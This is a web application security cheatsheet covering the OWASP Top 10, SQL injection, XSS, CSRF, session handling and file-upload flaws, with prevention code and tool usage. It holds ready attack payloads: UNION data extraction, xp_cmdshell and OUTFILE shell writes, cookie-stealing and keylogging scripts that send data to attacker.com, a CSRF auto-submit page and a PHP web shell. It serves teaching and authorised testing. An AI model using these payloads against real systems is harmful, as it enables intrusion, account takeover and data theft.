# Web Security Cheatsheet

Quick reference for web application security, OWASP Top 10, and common vulnerabilities.

## 📚 Table of Contents

- [OWASP Top 10](#owasp-top-10)
- [SQL Injection](#sql-injection)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
- [Authentication & Session Management](#authentication--session-management)
- [Security Misconfigurations](#security-misconfigurations)
- [File Upload Vulnerabilities](#file-upload-vulnerabilities)
- [Tools](#tools)

## 🔟 OWASP Top 10 (2021)

1. **Broken Access Control** - Improper authorization
2. **Cryptographic Failures** - Weak crypto, exposed data
3. **Injection** - SQL, NoSQL, OS command injection
4. **Insecure Design** - Missing security controls
5. **Security Misconfiguration** - Default configs, unnecessary features
6. **Vulnerable Components** - Outdated libraries
7. **Identification & Authentication Failures** - Weak auth
8. **Software & Data Integrity Failures** - Unsigned code, insecure CI/CD
9. **Security Logging & Monitoring Failures** - Insufficient logging
10. **Server-Side Request Forgery (SSRF)** - Internal resource access

## 💉 SQL Injection

### Types of SQL Injection

**1. Error-Based SQLi:**
```sql
' OR 1=1 --
' UNION SELECT NULL, NULL, NULL --
```

**2. Union-Based SQLi:**
```sql
' UNION SELECT username, password FROM users --
```

**3. Blind SQLi (Boolean-Based):**
```sql
' AND 1=1 --  (returns true)
' AND 1=2 --  (returns false)
```

**4. Time-Based Blind SQLi:**
```sql
' AND SLEEP(5) --
' OR IF(1=1, SLEEP(5), 0) --
```

### Common Payloads

**Authentication Bypass:**
```sql
Username: admin' --
Password: anything

Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

**Extracting Data:**
```sql
# Find number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  (error = 2 columns)

# Find injectable columns
' UNION SELECT NULL, NULL --
' UNION SELECT 'test', NULL --

# Extract database name
' UNION SELECT database(), NULL --

# List tables
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --

# List columns
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

# Extract data
' UNION SELECT username, password FROM users --
```

**Database-Specific Payloads:**

```sql
-- MySQL
' UNION SELECT @@version, NULL --
' UNION SELECT load_file('/etc/passwd'), NULL --
' INTO OUTFILE '/var/www/html/shell.php' --

-- PostgreSQL
' UNION SELECT version(), NULL --
'; COPY (SELECT '') TO PROGRAM 'id' --

-- MSSQL
' UNION SELECT @@version, NULL --
'; EXEC xp_cmdshell 'whoami' --

-- SQLite
' UNION SELECT sqlite_version(), NULL --
```

### Prevention

```python
# NEVER concatenate user input
# BAD
query = "SELECT * FROM users WHERE username = '" + user_input + "'"

# GOOD - Use parameterized queries
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))

# Or use ORM
user = User.query.filter_by(username=user_input).first()
```

### Tools

```bash
# SQLMap - Automated SQL injection
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# With POST data
sqlmap -u "http://target.com/login" --data="username=test&password=test"

# With cookies
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"
```

## 🎭 Cross-Site Scripting (XSS)

### Types of XSS

**1. Reflected XSS:**
```html
<!-- Vulnerable code -->
<p>Hello, <?php echo $_GET['name']; ?></p>

<!-- Payload -->
http://target.com/page?name=<script>alert('XSS')</script>
```

**2. Stored XSS:**
```html
<!-- Comment stored in database with XSS payload -->
Comment: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

**3. DOM-Based XSS:**
```javascript
// Vulnerable JavaScript
var search = document.location.hash.substring(1);
document.write("Results for: " + search);

// Exploit
http://target.com/search#<img src=x onerror=alert('XSS')>
```

### Common XSS Payloads

**Basic Alert:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**Cookie Stealing:**
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

**Keylogger:**
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**Bypass Filters:**
```html
<!-- Uppercase -->
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Mixed case -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Encoding -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Without script tags -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

<!-- Without parentheses -->
<script>onerror=alert;throw'XSS'</script>

<!-- Without quotes -->
<script>alert(document.domain)</script>
```

### Prevention

```html
<!-- HTML Escaping -->
<?php
// GOOD - Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
?>

<!-- JavaScript -->
<!-- GOOD - Validate and sanitize -->
<script>
const userInput = <?php echo json_encode($user_input); ?>;
</script>
```

**Content Security Policy (CSP):**
```html
<!-- Add CSP header -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

<!-- Or meta tag -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

## 🔐 Cross-Site Request Forgery (CSRF)

### CSRF Attack Example

**Vulnerable Form:**
```html
<!-- Legitimate bank transfer -->
<form action="http://bank.com/transfer" method="POST">
    <input name="to" value="">
    <input name="amount" value="">
    <button>Transfer</button>
</form>
```

**Attacker's Page:**
```html
<!-- Auto-submit form -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Or with image -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

### Prevention

**1. CSRF Tokens:**
```html
<!-- Server generates random token per session -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input name="amount" value="">
    <button>Submit</button>
</form>
```

**2. SameSite Cookies:**
```php
setcookie('session', $value, [
    'samesite' => 'Strict',  // or 'Lax'
    'secure' => true,
    'httponly' => true
]);
```

**3. Check Referer Header:**
```php
if (!str_starts_with($_SERVER['HTTP_REFERER'], 'https://yoursite.com/')) {
    die('Invalid request');
}
```

## 🔑 Authentication & Session Management

### Common Vulnerabilities

**1. Weak Password Policy:**
```python
# BAD
if len(password) >= 4:
    create_account()

# GOOD
import re
if (len(password) >= 12 and 
    re.search(r'[A-Z]', password) and
    re.search(r'[a-z]', password) and
    re.search(r'[0-9]', password) and
    re.search(r'[!@#$%^&*]', password)):
    create_account()
```

**2. Session Fixation:**
```php
// GOOD - Regenerate session ID on login
session_start();
if (authenticate($username, $password)) {
    session_regenerate_id(true);  // Prevent fixation
    $_SESSION['user'] = $username;
}
```

**3. Insecure Password Storage:**
```python
# BAD
password_hash = md5(password)  # Broken hash
password_hash = sha1(password)  # Still bad

# GOOD
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Verify
if bcrypt.checkpw(input_password.encode(), stored_hash):
    print("Correct password")
```

### Best Practices

```python
# Complete authentication example
import bcrypt
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = 'random-secret-key'  # Use strong random key

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Get user from database
    user = db.get_user(username)
    
    if user and bcrypt.checkpw(password.encode(), user.password_hash):
        # Regenerate session
        session.regenerate()
        session['user_id'] = user.id
        session['username'] = username
        return redirect('/dashboard')
    else:
        # Generic error (don't reveal which failed)
        return "Invalid credentials"

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')
```

## ⚙️ Security Misconfigurations

### Common Issues

**1. Directory Listing:**
```apache
# .htaccess - Disable directory listing
Options -Indexes
```

**2. Verbose Error Messages:**
```php
// BAD - In production
ini_set('display_errors', 1);
error_reporting(E_ALL);

// GOOD - In production
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(0);
```

**3. Unnecessary HTTP Methods:**
```apache
# Limit to GET and POST
<LimitExcept GET POST>
    Require all denied
</LimitExcept>
```

**4. Missing Security Headers:**
```python
# Flask example
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

## 📁 File Upload Vulnerabilities

### Common Attacks

**1. Upload PHP Shell:**
```php
<!-- shell.php -->
<?php system($_GET['cmd']); ?>
```

**2. Bypass Extension Checks:**
```
shell.php.jpg
shell.php%00.jpg  (null byte)
shell.php;.jpg
shell.pHP
shell.php5
```

### Prevention

```python
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file'
    
    file = request.files['file']
    
    # Check filename
    if not allowed_file(file.filename):
        return 'Invalid file type'
    
    # Sanitize filename
    filename = secure_filename(file.filename)
    
    # Check file content (magic bytes)
    if file.read(4) not in [b'\x89PNG', b'\xff\xd8\xff']:  # PNG or JPEG
        return 'Invalid file content'
    file.seek(0)  # Reset pointer
    
    # Save outside webroot
    file.save(os.path.join('/var/uploads', filename))
    
    return 'File uploaded'
```

## 🛠️ Tools

### Burp Suite

```bash
# Essential features
- Proxy: Intercept and modify requests
- Repeater: Resend and modify requests
- Intruder: Automated attacks
- Scanner: Automated vulnerability scanning (Pro)
- Decoder: Encode/decode data
```

**Common Workflows:**
1. Configure browser proxy (127.0.0.1:8080)
2. Browse target site
3. Intercept request in Burp
4. Send to Repeater
5. Modify and test payloads
6. Document findings

### OWASP ZAP

```bash
# Automated scan
zap-cli quick-scan http://target.com

# Spider site
zap-cli spider http://target.com

# Active scan
zap-cli active-scan http://target.com

# Export report
zap-cli report -o report.html -f html
```

### Nikto

```bash
# Basic scan
nikto -h http://target.com

# With authentication
nikto -h http://target.com -id admin:password

# SSL/TLS
nikto -h https://target.com -ssl

# Specific port
nikto -h target.com -p 8080
```

### wfuzz

```bash
# Directory fuzzing
wfuzz -w wordlist.txt http://target.com/FUZZ

# POST parameter fuzzing
wfuzz -w wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login

# Header fuzzing
wfuzz -w wordlist.txt -H "X-Forwarded-For: FUZZ" http://target.com
```

## 📚 Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacker101](https://www.hacker101.com/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

**Remember**: Only test applications you own or have permission to test!
